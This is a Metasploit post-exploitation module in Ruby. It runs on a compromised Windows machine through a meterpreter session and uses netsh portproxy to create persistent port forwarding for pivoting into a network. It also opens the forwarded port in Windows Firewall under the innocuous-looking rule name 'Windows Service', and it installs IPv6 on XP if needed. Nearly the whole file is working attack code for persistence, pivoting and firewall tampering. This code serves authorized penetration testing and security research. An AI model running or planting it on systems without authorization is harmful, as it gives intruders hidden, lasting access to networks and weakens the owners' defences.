##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'
require 'msf/core/post/windows/priv'
require 'msf/core/post/common'

class Metasploit3 < Msf::Post

  include Msf::Post::Windows::Priv
  include Msf::Post::Common

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows Manage Set Port Forwarding With PortProxy',
      'Description'   => %q{
        This module uses the PortProxy interface from netsh to set up
        port forwarding persistently (even after reboot). PortProxy
        supports TCP IPv4 and IPv6 connections.
      },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'Borja Merino <bmerinofe[at]gmail.com>'],
      'Platform'      => [ 'windows' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))

    register_options(
      [
        OptAddress.new('LOCAL_ADDRESS',   [ true, 'IPv4/IPv6 address to which to listen.']),
        OptAddress.new('CONNECT_ADDRESS', [ true, 'IPv4/IPv6 address to which to connect.']),
        OptPort.new(   'CONNECT_PORT',    [ true, 'Port number to which to connect.']),
        OptPort.new(   'LOCAL_PORT',      [ true, 'Port number to which to listen.']),
        OptBool.new(   'IPV6_XP',         [ true, 'Install IPv6 on Windows XP (needed for v4tov4).', true]),
        OptEnum.new(   'TYPE',            [ true, 'Type of forwarding', 'v4tov4', ['v4tov4','v6tov6','v6tov4','v4tov6']])
      ], self.class)
    end

  def run
    if not is_admin?
      print_error("You don't have enough privileges. Try getsystem.")
      return
    end

    # Due to a bug in Windows XP you need to install IPv6
    # http://support.microsoft.com/kb/555744/en-us
    if sysinfo["OS"] =~ /XP/
      return unless check_ipv6
    end

    return unless enable_portproxy
    fw_enable_ports

  end

  def enable_portproxy
    rtable = Rex::Ui::Text::Table.new(
      'Header' => 'Port Forwarding Table',
      'Indent' =>  3,
      'Columns' => ['LOCAL IP', 'LOCAL PORT', 'REMOTE IP', 'REMOTE PORT']
    )

    print_status("Setting PortProxy ...")
    netsh_args = "interface portproxy "
    netsh_args << "add #{datastore['TYPE']} "
    netsh_args << "listenport=#{datastore['LOCAL_PORT']} "
    netsh_args << "listenaddress=#{datastore['LOCAL_ADDRESS']} "
    netsh_args << "connectport=#{datastore['CONNECT_PORT']} "
    netsh_args << "connectaddress=#{datastore['CONNECT_ADDRESS']}"
    output = cmd_exec("netsh", netsh_args)
    if output.size > 2
      print_error("Setup error. Verify parameters and syntax.")
      return false
    else
      print_good("PortProxy added.")
    end

    output = cmd_exec("netsh","interface portproxy show all")
    output.each_line do |l|
      rtable << l.split(" ") if l.strip =~ /^[0-9]|\*/
    end
    print_status(rtable.to_s)
    return true
  end

  def ipv6_installed()
    output = cmd_exec("netsh","interface ipv6 show interface")
    if output.lines.count > 2
      return true
    else
      return false
    end
  end

  def check_ipv6
    if ipv6_installed
      print_status("IPv6 is already installed.")
      return true
    elsif not datastore['IPV6_XP']
      print_error("IPv6 is not installed. You need IPv6 to use portproxy.")
      print_status("IPv6 can be installed with \"netsh interface ipv6 install\"")
      return false
    else
      print_status("Installing IPv6... can take a little long")
      cmd_exec("netsh","interface ipv6 install",120)
      if not ipv6_installed
        print_error("IPv6 was not successfully installed. Run it again.")
        return false
      end
      print_good("IPv6 was successfully installed.")
      return true
    end
  end

  def fw_enable_ports
    print_status ("Setting port #{datastore['LOCAL_PORT']} in Windows Firewall ...")
    if sysinfo["OS"] =~ /Windows 7|Vista|2008|2012/
      cmd_exec("netsh","advfirewall firewall add rule name=\"Windows Service\" dir=in protocol=TCP action=allow localport=\"#{datastore['LOCAL_PORT']}\"")
    else
      cmd_exec("netsh","firewall set portopening protocol=TCP port=\"#{datastore['LOCAL_PORT']}\"")
    end
    output = cmd_exec("netsh","firewall show state")

    if output =~ /^#{datastore['LOCAL_PORT']} /
      print_good("Port opened in Windows Firewall.")
    else
      print_error("There was an error enabling the port.")
    end
  end
end